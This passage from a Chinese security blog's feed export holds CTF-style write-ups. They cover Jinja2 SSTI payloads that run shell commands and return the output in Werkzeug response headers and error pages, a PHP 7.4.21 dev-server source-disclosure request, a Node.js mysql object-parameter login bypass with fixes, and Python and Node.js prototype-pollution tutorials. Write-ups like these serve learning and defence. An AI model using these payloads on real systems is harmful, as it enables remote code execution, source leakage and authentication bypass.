src="/Jinjia2-SSTI%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%9B%9E%E6%98%BE/1745500454369-c17b9c1d-7df9-4c32-ba0e-badb996e3478.png"></p><p>利用点就是在这里，这里的方法为什么可以利用，重点在于它的@property装饰器，这个的介绍如下：</p><ul><li>这是一个装饰器，使用这个装饰器，可以将一个方法转换为属性，也就是说使用这个装饰器的方法，可以使其在访问时可以像访问属性一样，它把方法包装成属性，让方法可以以属性的形式被访问或调用。</li></ul><p>也就是说，这个方法其实就等同于下面这种调用：</p><p>self.server_version=self.server._server_version</p><p>所以可以直接给它赋str类型的值。后面再来根据过程来给出payload</p><p>现在已经知道了对象，那么怎么获取到对象呢，即怎么获取到werkzeug.serving.WSGIRequestHandler对象，在这里我们可以通过使利用sys模块来获取到相关对象，</p><p>就是通过sys模块来获取到相关类，在原型链污染中学习了如何获取到sys模块，所以payload如下：</p><pre class="line-numbers language-language-python"><code class="language-language-python">{{lipsum.__globals__.__builtins__.setattr(lipsum.__spec__.__init__.__globals__.sys.modules.werkzeug.serving.WSGIRequestHandler,"server_version",lipsum.__globals__.__builtins__['__import__']('os').popen('chdir').read())}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>同样的还可以利用这个sys_version，只不过这里是直接调用的类的属性：</p><pre class="line-numbers language-language-python"><code class="language-language-python">{{lipsum.__globals__.__builtins__.setattr(lipsum.__spec__.__init__.__globals__.sys.modules.werkzeug.serving.WSGIRequestHandler,"sys_version",lipsum.__globals__.__builtins__['__import__']('os').popen('chdir').read())}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>像server_version一样的“调用方法”。所以payload如下：</p><p>获取sys模块不只这种，同样的还存在于全局变量中，所以其实直接获取即可，如下payload：</p><pre class="line-numbers language-language-python"><code class="language-language-python">{{url_for.__globals__.__builtins__.setattr(url_for.__globals__.sys.modules.werkzeug.serving.WSGIRequestHandler,"sys_version",url_for.__globals__.__builtins__['__import__']('os').popen('whoami').read())}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>参考文章的payload如下：</p><pre class="line-numbers language-language-python"><code class="language-language-python">{{g.pop.__globals__.__builtins__.setattr(g.pop.__globals__.sys.modules.werkzeug.serving.WSGIRequestHandler,"server_version",g.pop.__globals__.__builtins__.__import__('os').popen('whoami').read())}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="响应头扩展"><a href="#响应头扩展" class="headerlink" title="响应头扩展"></a>响应头扩展</h1><pre class="line-numbers language-language-python"><code class="language-language-python">{{url_for.__globals__.__builtins__.setattr(url_for.__globals__.sys.modules.werkzeug.serving.WSGIRequestHandler,"request_version",url_for.__globals__.__builtins__['__import__']('os').popen('whoami').read())}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>回显的HTTP/1.1，并且是str类型，所以应该是可以如下利用的：</p><pre class="line-numbers language-language-python"><code class="language-language-python">{{url_for.__globals__.__builtins__.setattr(url_for.__globals__.sys.modules.werkzeug.serving.WSGIRequestHandler,"protocol_version",url_for.__globals__.__builtins__['__import__']('os').popen('whoami').read())}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="错误页面回显"><a href="#错误页面回显" class="headerlink" title="错误页面回显"></a>错误页面回显</h1><p>比如方法错误的回显，或者500页面的回显：</p><p>状态码回显</p><pre class="line-numbers language-language-python"><code class="language-language-python">{{url_for.__globals__.__builtins__.setattr(url_for.__globals__.sys.modules.werkzeug.wrappers.Response,"default_status",url_for.__globals__.__builtins__['__import__']('os').popen('whoami').read())}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>改404页面的（先传payload再人为构造错误页面）：</p><pre class="line-numbers language-language-python"><code class="language-language-python">{{url_for.__globals__.__builtins__.setattr(url_for.__globals__.sys.modules.werkzeug.exceptions.NotFound,"description",url_for.__globals__.__builtins__['__import__']('os').popen('whoami').read())}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>405的：</p><pre class="line-numbers language-language-python"><code class="language-language-python">{{url_for.__globals__.__builtins__.setattr(url_for.__globals__.sys.modules.werkzeug.exceptions.MethodNotAllowed,"description",url_for.__globals__.__builtins__['__import__']('os').popen('whoami').read())}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>500的：</p><pre class="line-numbers language-language-python"><code class="language-language-python">{{url_for.__globals__.__builtins__.setattr(url_for.__globals__.sys.modules.werkzeug.exceptions.InternalServerError,"description",url_for.__globals__.__builtins__['__import__']('os').popen('whoami').read())}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ssti </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP_=7.4.21 Development Server源码泄露漏洞</title>
      <link href="/2025/04/29/PHP_=7.4.21%20Development%20Server%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"/>
      <url>/2025/04/29/PHP_=7.4.21%20Development%20Server%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>在复现第八届封神台ctf第一次接触到了<code>php -S服务启动后造成代码泄露</code>的漏洞</p><p>PHP从5.4开始，就提供了一个内置的web服务器，主要是用来做本地的开发用的。<br>前提：php已经加入到本地电脑的环境变量中</p><p>cd 项目目录</p><p>php -S localhost:8080  </p><p>通过<code>php -S</code>开起的内置WEB服务器存在源码泄露漏洞，可以将PHP文件作为静态文件直接输出源码  </p><p>随意访问一个不存在的php，触发以下页面，这算是php -S启动服务的一个标志：（页面来自封神台的图床题）</p><p>![](PHP_=7.4.21 Development Server源码泄露漏洞/1745475646348-eadb9113-2888-4365-b623-c1760e25cf3e.png)</p><p>我们这里就结合这道题来介绍这个漏洞的利用</p><p>我们bp抓包发送repeater来准备读取unzip.php的源码，一定能要关闭repeater的自动更新Content-Length  以及显示回车换行，方便数据包的构造。</p><p>![](PHP_=7.4.21 Development Server源码泄露漏洞/1745476282943-e7089b83-167d-4ec0-a8bc-79671a3362f5.png)</p><p>这里就读取到了源码但是不在接着往下写，想往下看这题去看我的wp</p><p>这里先上poc并附上解释</p><pre class="line-numbers language-language-http"><code class="language-language-http">GET /unzip.php HTTP/1.1Host: 159.138.63.173:8085GET /AAA.txt Http/1.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p> ps：这里一定要换行  </p><p>第一个GET后的/unzip.php是直接访问已存在的unzip.php文件</p><p>PHP源码中的php_cli_server_request_translate_vpath函数将请求的PHP文件的路径转换为文件系统上的</p><p>完整路径。</p><p>如果请求的文件是一个目录，它会检查是否存在索引文件，如index.php或 index.html，并使用其中一个文</p><p>件的路径(如果找到的话)。</p><p>第二个GET后的/请求的是目录而不是文件。</p><p>此PHP版本提供的代码包括一个检查，以确定请求的文件是应被视为静态文件还是作为PHP文件执行。</p><p>这是通过检查文件的扩展名来完成的。如果扩展不是.php或.PHP，或者如果扩展名的长度不等于3,则该文件被视为静态文件，</p><p><strong>因此如果我们把第二个GET请求的内容改为类似1.txt的文件时，php源码将会被以静态文件的方式泄露(即直接访问获取)</strong></p>]]></content>
      
      
      <categories>
          
          <category> php特性 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于nodejs mysql module导致的登陆漏洞</title>
      <link href="/2025/04/29/%E5%85%B3%E4%BA%8Enodejs%20mysql%20module%E5%AF%BC%E8%87%B4%E7%9A%84%E7%99%BB%E9%99%86%E6%BC%8F%E6%B4%9E/"/>
      <url>/2025/04/29/%E5%85%B3%E4%BA%8Enodejs%20mysql%20module%E5%AF%BC%E8%87%B4%E7%9A%84%E7%99%BB%E9%99%86%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>在复现第八届封神台CTF时碰到了一个这样的漏洞</p><p>这一题的描述如下</p><p>我可以很嚣张的告诉你：用户名是admin，后端用的是nodejs，我还用上了数据库，flag就放在后台 不需要任何扫描或爆破，请不要扫描和爆破，这没有意义</p><p> 部分代码：</p><pre class="line-numbers language-language-js"><code class="language-language-js">var mysql = require("mysql");if (username && password) {pool.query("SELECT * FROM accounts WHERE username = ? AND password = ?",<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p> 这里使用了参数化查询(?作为占位符)，这是防止SQL注入的好做法</p><p>但是 </p><p>我们现在将改变<code>password</code>参数到<code>password[password]</code>使参数为<code>Object</code>而不是<code>String</code>. </p><p>我们就可以访问管理员帐户</p><p> 或者也可以将数据作为 JSON 传递并绕过身份验证</p><p>![](关于nodejs mysql module导致的登陆漏洞/1745563696799-2cdd5331-7ced-4369-8a76-83318b1849ff.png)</p><p> 这是由于某些类型(特别是对象类型)<strong>quoted identifiers</strong>在被转义函数转义时包含引用的标识符。引用的标识符用于指示数据库、表格、列或此类。有了这个,我们可以引用查询中的其他表或列。  </p><p>将<code>password = </code>obj_key_1<code> </code>更改为<code>password = </code>password``</p><p>自引用的标识符<code>password</code>被视为一列,它最终会成为<code>password = password</code></p><p>现在,如果我们改变<code>obj_val_1</code>为1,它最终将成为<code>(1=1)=1</code>最终返回1。</p><p>因此,当密码参数传递为<code>{'password': 1}</code>它最终会转化为``password<code>=1</code>最后绕过了身份验证逻辑。</p><p>所以在面对nodejs和mysql的登陆时我们可以<br>username[username]=1&amp;password[password]=1</p><p>来登录</p><p>![](关于nodejs mysql module导致的登陆漏洞/1745564157565-c3c4074a-59f0-4837-ae77-33949227a7ab.png)</p><p>或者<br>username=admin&amp;password[password]=1</p><p>登录特定用户如admin</p><p>![](关于nodejs mysql module导致的登陆漏洞/1745564201946-966e24f7-d3c3-407c-899e-67cade203047.png)</p><p><strong>防御方法</strong></p><p>解决方法 1:在创建连接时添加 stringifyObjects 选项</p><p>添加<code>"stringifyObjects":true</code>调用时的选项<code>mysql.createConnection</code>最终会阻止所有意想不到的行为,当<code>Object</code>在参数中传递。</p><p>但是,这可能会影响项目中所有现有的查询,并且当某些查询实际通过时可能会引入另一个问题。<code>Object</code>参数。您可能还想查看变通方法2作为替代方案。</p><p>解决方法 2:添加类型检查</p><p>解决方法1可能是解决这个问题的最有效和最有效的方法。</p><p>然而,前一种解决方法只会阻止任何意想不到的行为。<code>Object</code>独家。其他类型如<code>Array</code>, 数组 of<code>Array</code>,<code>Boolean</code>仍然可能导致意想不到的问题,因为它仍然根据值类型以不同的方式逃逸。前一种解决方法在许多罕见情况下仍然会引入其他意想不到的行为。</p><p>因此,最好添加类型检查代码,使您的代码更加严格。这种解决方法的缺点是,添加类型检查代码并对项目进行维护可能需要花费大量时间和成本。此外,在编写代码时,您可能会错过类型检查。</p>]]></content>
      
      
      <categories>
          
          <category> nodejs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> nodejs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python原型链污染</title>
      <link href="/2025/04/17/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
      <url>/2025/04/17/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
      
        <content type="html"><![CDATA[<h1 id="基础payload"><a href="#基础payload" class="headerlink" title="基础payload"></a>基础payload</h1><p><strong>直接污染static目录</strong></p><pre class="line-numbers language-language-python"><code class="language-language-python">data = {    "__init__":{        "__globals__":{                "app":{                        "_static_folder": "/"                    }            }    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接把static污染成根目录，假设存在/flag的子网和/flag的文件存放flag就能直接下载flag</p><pre class="line-numbers language-language-python"><code class="language-language-python">{    "__init__": {        "__globals__": {                    "BLACKLIST_IN_index": ""            }    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这种攻击方式可以在Python中实现对类属性值的污染。需要注意的是，由于Python中的安全设定和部分特殊属性类型限定，并不是所有的类其所有的属性都是可以被污染的，不过可以肯定的，污染只对类的属性起作用，对于类方法是无效的。</p><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><h2 id="合并函数"><a href="#合并函数" class="headerlink" title="合并函数#"></a>合并函数<a href="https://www.cnblogs.com/Article-kelp/p/17068716.html#%E5%90%88%E5%B9%B6%E5%87%BD%E6%95%B0"><font style="color:#003884;">#</font></a></h2><p>Pydash模块中的<strong>set_和set_with</strong>函数具有如下实例中<strong>merge</strong>函数类似的类属性赋值逻辑，能够实现污染攻击需要一个数值合并函数将特定值污染到类的属性当中，一个标准示例如下：</p><pre class="line-numbers language-language-python"><code class="language-language-python">def merge(src, dst):    # 遍历源字典 (src) 中的每一对键值对    for k, v in src.items():        # 检查目标对象 dst 是否是字典类型（具有 __getitem__ 方法）        if hasattr(dst, '__getitem__'):            # 如果目标字典中已经有这个键且对应的值是字典类型，则递归合并            if dst.get(k) and type(v) == dict:                merge(v, dst.get(k))            else:                # 否则直接将源字典中的值赋给目标字典的键                dst[k] = v        # 如果目标对象 dst 是具有指定属性的对象（通过 hasattr(dst, k) 判断）        # 并且源字典中的值是字典类型，则递归合并        elif hasattr(dst, k) and type(v) == dict:            merge(v, getattr(dst, k))        else:            # 否则将源字典的值赋给目标对象的属性            setattr(dst, k, v)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="污染示例-；"><a href="#污染示例-；" class="headerlink" title="污染示例 ；"></a>污染示例 ；</h2><p>由于Python中的类会继承父类中的属性，而类中声明（并不是实例中声明）的属性是唯一的，所以我们的目标就是这些在多个类、示例中仍然指向唯一的属性，如类中自定义属性及以__开头的内置属性等</p><p>修改自定义属性示例</p><pre class="line-numbers language-language-python"><code class="language-language-python">class father:    secret = "haha"class son_a(father):    passclass son_b(father):    passdef merge(src, dst):    # Recursive merge function    for k, v in src.items():        if hasattr(dst, '__getitem__'):            if dst.get(k) and type(v) == dict:                merge(v, dst.get(k))            else:                dst[k] = v        elif hasattr(dst, k) and type(v) == dict:            merge(v, getattr(dst, k))        else:            setattr(dst, k, v)instance = son_b()payload = {    "__class__" : {        "__base__" : {            "secret" : "no way"        }    }}print(son_a.secret)#hahaprint(instance.secret)#hahamerge(payload, instance)print(son_a.secret)#no wayprint(instance.secret)#no way（关注值的更改和污染方式）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="object无法污染"><a href="#object无法污染" class="headerlink" title="object无法污染"></a>object无法污染</h2><p>正如前面所述，并不是所有的类的属性都可以被污染，如<strong>Object的属性就无法被污染</strong>，所以需要目标类能够被切入点类或对象可以通过属性值查找获取到</p><pre class="line-numbers language-language-python"><code class="language-language-python">def merge(src, dst):    # Recursive merge function    for k, v in src.items():        if hasattr(dst, '__getitem__'):            if dst.get(k) and type(v) == dict:                merge(v, dst.get(k))            else:                dst[k] = v        elif hasattr(dst, k) and type(v) == dict:            merge(v, getattr(dst, k))        else:            setattr(dst, k, v)payload = {    "__class__" : {            "__str__" : "Polluted ~"        }    }merge(payload, object)#TypeError: can't set attributes of built-in/extension type 'object'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>在上边的介绍中污染类属性是<strong>通过示例的__base__属性查找到其继承的父类</strong>，但是如果目标类与切入点类或实例没有继承关系时，这种方法就显得十分无力</p><h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h3><p>在Python中，函数或类方法（对于类的内置方法如__init__这些来说，内置方法在并未重写时其数据类型为装饰器即wrapper_descriptor，只有在重写后才是函数function）均具有一个__globals__属性，该属性将函数或类方法所申明的变量空间中的全局变量以字典的形式返回（相当于这个变量空间中的globals函数的返回值）</p><p>也就是说里面有所有的类与属性</p><p>污染示例（注意类内变量修改和类外的区别）</p><pre class="line-numbers language-language-python"><code class="language-language-python">secret_var = 114def test():    passclass a:    secret_class_var = "secret"class b:    def __init__(self):        passdef merge(src, dst):    # Recursive merge function    for k, v in src.items():        if hasattr(dst, '__getitem__'):            if dst.get(k) and type(v) == dict:                merge(v, dst.get(k))            else:                dst[k] = v        elif hasattr(dst, k) and type(v) == dict:            merge(v, getattr(dst, k))        else:            setattr(dst, k, v)instance = b()payload = {    "__init__" : {            "__globals__" : {                "secret_var" : 514,                "a" : {                    "secret_class_var" : "Pooooluted ~"                }            }        }    }print(a.secret_class_var)#secretprint(secret_var)#114merge(payload, instance)print(a.secret_class_var)#Pooooluted ~print(secret_var)#514<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="已加载模块"><a href="#已加载模块" class="headerlink" title="已加载模块"></a>已加载模块</h3><p>需要对并不是定义在入口文件中的类对象或者属性，而我们的操作位置又在入口文件中，这个时候就需要对其他加载过的模块来获取了—也就是说需要污染的在我们操作的下文</p><p>简单的示例</p><pre class="line-numbers language-language-python"><code class="language-language-python">#test.pyimport test_1class cls:    def __init__(self):        passdef merge(src, dst):    # Recursive merge function    for k, v in src.items():        if hasattr(dst, '__getitem__'):            if dst.get(k) and type(v) == dict:                merge(v, dst.get(k))            else:                dst[k] = v        elif hasattr(dst, k) and type(v) == dict:            merge(v, getattr(dst, k))        else:            setattr(dst, k, v)instance = cls()payload = {    "__init__" : {        "__globals__" : {            "test_1" : {                "secret_var" : 514,                "target_class" : {                    "secret_class_var" : "Poluuuuuuted ~"                }            }        }    }}print(test_1.secret_var)#secretprint(test_1.target_class.secret_class_var)#114merge(payload, instance)print(test_1.secret_var)#514print(test_1.target_class.secret_class_var)#Poluuuuuuted secret_var = 114class target_class:    secret_class_var = "secret"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们更改的secret_var等都在污染之后</p><p>在加载关系简单的情况下，我们可以直接从文件的_<strong>import语法部分</strong>_找到目标模块，这个时候我们就可以通过获取全局变量来得到目标模块</p><p>但是实际上带都是没法直接这么简单的直接查看的，我们就需要利用sys模块</p><h4 id="sys模块"><a href="#sys模块" class="headerlink" title="sys模块"></a>sys模块</h4><p>sys模块的modules属性以字典的形式包含了程序自开始运行时所有已加载过的模块，可以直接从该属性中获取到目标模块</p><p><em>也就是说勉强算是利用globals的进阶版，这里只上payload了</em></p><pre class="line-numbers language-language-python"><code class="language-language-python">payload = {    "__init__" : {        "__globals__" : {            "sys" : {                "modules" : {                    "test_1" : {                        "secret_var" : 514,                        "target_class" : {                            "secret_class_var" : "Poluuuuuuted ~"                        }                    }                }            }        }    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当然我们去使用的Payload绝大部分情况下是不会这样的，如上的</p><p>上边的Payload是在已经import sys的情况下使用的，而大部分情况是没有直接导入的，上述只是为了引出下文的真正的复杂的使用</p><h4 id="loader"><a href="#loader" class="headerlink" title="loader"></a>loader</h4><p>这样问题就从<strong>寻找import特定模块的语句</strong>转换为**寻找import了sys模块的语句，**为了进一步简化问题，这里采用方式是利用Python中加载器loader</p><p>加载器loader</p><p>是为实现模块加载而设计的类，其在importlib这一内置模块中有具体实现</p><p>关键是—-importlib模块下所有的py文件中均引入了sys模块</p><p>只要我们能过获取到一个loader便能用如loader.<strong>init</strong>.<strong>globals</strong>[‘sys’]的方式拿到sys模块，这样进而获取目标模块。</p><p>并且对于一个模块来说，模块中的一些<strong>内置属性会在被加载时自动填充</strong></p><p>__loader__内置属性会被赋值为加载该模块的loader，这样只要能获取到任意的模块便能通过__loader__属性获取到loader，而且对于python3来说除了在debug模式下的主文件中__loader__为None以外，正常执行的情况每个模块__loader__属性均有一个对应的类</p><h4 id="spec"><a href="#spec" class="headerlink" title="spec"></a><strong>spec</strong></h4><p>__spec__内置属性在Python 3.4版本引入，其包含了关于类加载时的信息，本是定义在Lib/importlib/_bootstrap.py的类ModuleSpec，显然因为定义在importlib模块下的py文件，所以可以直接采用</p><p>&lt;模块名&gt;.<strong>spec</strong>.<strong>init</strong>.<strong>globals</strong>[‘sys’]获取到sys模块</p><h4 id="ModuleSpec"><a href="#ModuleSpec" class="headerlink" title="ModuleSpec"></a>ModuleSpec</h4><p>由于ModuleSpec的属性值设置，相对于上面的获取方式，还有一种相对长的</p><p>payload的获取方式，主要是利用ModuleSpec中的loader属性。如属性名所示，该属性的值是模块加载时所用的loader所以有这样的相对长的</p><p>Payload：</p><p>&lt;模块名&gt;.<strong>spec</strong>.loader.<strong>init</strong>.<strong>globals</strong>[‘sys’]</p><h3 id="函数形参默认值替换"><a href="#函数形参默认值替换" class="headerlink" title="函数形参默认值替换"></a><strong>函数形参默认值替换</strong></h3><p>函数的__defaults__和__kwdefaults__这两个内置属性（分别获取位置或关键字参数，关键字参数）</p><p>这里需要了解了解什么是位置或关键字参数和关键字参数</p><p>即—-def name(p1, p2, /, p_or_kw, *, kw):</p><p>为了便于理解给出实验示例</p><pre class="line-numbers language-language-python"><code class="language-language-python">def func_a(var_1, var_2 =2, var_3 = 3):    passdef func_b(var_1, /, var_2 =2, var_3 = 3):    pass    def func_c(var_1, var_2 =2, *, var_3 = 3):    passdef func_d(var_1, /, var_2 =2, *, var_3 = 3):    passprint(func_a.__defaults__)#(2, 3)print(func_b.__defaults__)#(2, 3)print(func_c.__defaults__)#(2,)print(func_d.__defaults__)#(2,)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过替换该属性便能实现对函数位置或键值形参的默认值替换，但稍有问题的是该属性值要求为元组类型，而通常的如JSON等格式并没有元组这一数据类型设计概念，这就需要环境中有合适的解析输入的方式</p><p>污染示例</p><pre class="line-numbers language-language-python"><code class="language-language-python">def evilFunc(arg_1 , shell = False):    if not shell:        print(arg_1)    else:        print(__import__("os").popen(arg_1).read())class cls:    def __init__(self):        passdef merge(src, dst):    # Recursive merge function    for k, v in src.items():        if hasattr(dst, '__getitem__'):            if dst.get(k) and type(v) == dict:                merge(v, dst.get(k))            else:                dst[k] = v        elif hasattr(dst, k) and type(v) == dict:            merge(v, getattr(dst, k))        else:            setattr(dst, k, v)instance = cls()payload = {    "__init__" : {        "__globals__" : {            "evilFunc" : {                "__defaults__" : (                    True ,                )            }        }    }}evilFunc("whoami")#whoamimerge(payload, instance)evilFunc("whoami")#article-kelp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>kw</p><pre class="line-numbers language-language-python"><code class="language-language-python">def evilFunc(arg_1 , * , shell = False):    if not shell:        print(arg_1)    else:        print(__import__("os").popen(arg_1).read())class cls:    def __init__(self):        passdef merge(src, dst):    # Recursive merge function    for k, v in src.items():        if hasattr(dst, '__getitem__'):            if dst.get(k) and type(v) == dict:                merge(v, dst.get(k))            else:                dst[k] = v        elif hasattr(dst, k) and type(v) == dict:            merge(v, getattr(dst, k))        else:            setattr(dst, k, v)instance = cls()payload = {    "__init__" : {        "__globals__" : {            "evilFunc" : {                "__kwdefaults__" : {                    "shell" : True                }            }        }    }}evilFunc("whoami")#whoamimerge(payload, instance)evilFunc("whoami")#article-kelp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 原型链污染 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> python原型链污染 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nodejs原型链污染</title>
      <link href="/2025/04/17/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
      <url>/2025/04/17/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
      
        <content type="html"><![CDATA[<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><p><strong>constructor.prototype</strong>可以代替**<strong>proto</strong>**</p><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h5 id="Nodejs和JavaScipt和JSON的区别"><a href="#Nodejs和JavaScipt和JSON的区别" class="headerlink" title="Nodejs和JavaScipt和JSON的区别"></a>Nodejs和JavaScipt和JSON的区别</h5><p>先来了解一下<strong>Nodejs和JavaScipt和JSON的区别</strong>吧，一直也是懵懵懂懂</p><p>如果没有node，那么我们的JavaScript代码则由浏览器中的<strong>JavaScript解析器</strong>进行解析。几乎所有的浏览器都配备了JavaScript的解析功能（最出名的就是google的v8）， 这也是为什么我们能在f12中直接执行JavaScript的原因</p><p>而Nodejs则是由这个解析器单独从浏览器中拿出来，并进行了一系列的处理，最后成为了一个可以在服务端运行JavaScript的环境</p><p>JSON是JavaScript的对象表示方法，它表示的是声明对象的一种格式， 由于我们从前端接收到的数据基本都是字符串，因此在服务端如果要将这些字符串处理为其他格式，比如对象，就需要用到JSON了。</p><p>接着便是引入我们的nodejs原型链污染的知识了</p><h5 id="原型对象（prototype）与原型连接点（proto）与原型链"><a href="#原型对象（prototype）与原型连接点（proto）与原型链" class="headerlink" title="原型对象（prototype）与原型连接点（proto）与原型链"></a>原型对象（prototype）与原型连接点（<strong>proto</strong>）与原型链</h5><p>在c++或java这些面向对象的语言中，我们如果想要一个对象，首先需要使用关键字class声明一个类，再使用关键字new一个对象出来(经常书写的php也是这样)，但是在JavaScript中没有class以及类这种概念（为了简化编写JavaScript代码，ECMAScript 6后增加了class语法，但class其实只是一个语法糖）。 在JavaScript有这么两种声明对象的方式</p><p><strong>直接实例化构造方法Object()来创建对象</strong></p><pre class="line-numbers language-language-python"><code class="language-language-python">person=new Object()person.firstname="John";person.lastname="Doe";person.age=50;person.eyecolor="blue";这种创建对象的方法还有另一种写法 如下person={firstname:"John",lastname:"Doe",age:50,eyecolor:"blue"};这种方法通过直接实例化构造方法Object()来创建对象<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>先创建构造函数 再实例化构造函数</strong></p><pre class="line-numbers language-language-python"><code class="language-language-python">function person(firstname,lastname,age,eyecolor)  这里创建了一个“类” 但是在JavaScript中叫做构造函数或者构造器{    this.firstname=firstname;    this.lastname=lastname;    this.age=age;    this.eyecolor=eyecolor;}var myFather=new person("John","Doe",50,"blue");    通过这个“类”实例化对象var myMother=new person("Sally","Rally",48,"green");这种方法先创建构造函数 再实例化构造函数 构造函数function也属于Object 如果对这里为什么属于Object而不属于Function有疑问请继续阅读 下面会解释<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="污染前置知识"><a href="#污染前置知识" class="headerlink" title="污染前置知识"></a>污染前置知识</h5><p>既然是通过实例化Object来创建对象或创建构造函数，在JavaScript中有两个很特殊的对象，Function() 和 Object() ，它们两个既是构造函数也是对象，作为对象是不是应该有一个“类”去作为他们的模板呢？</p><p>对于Object()来说，要声明这么一个构造函数我们可以使用关键字function来创建 。（在底层 使用function创建一个函数 其实就相当于这个过程）</p><pre class="line-numbers language-language-python"><code class="language-language-python">function Object(){    }在底层为var Object = new Function();<span aria-hidden="true" 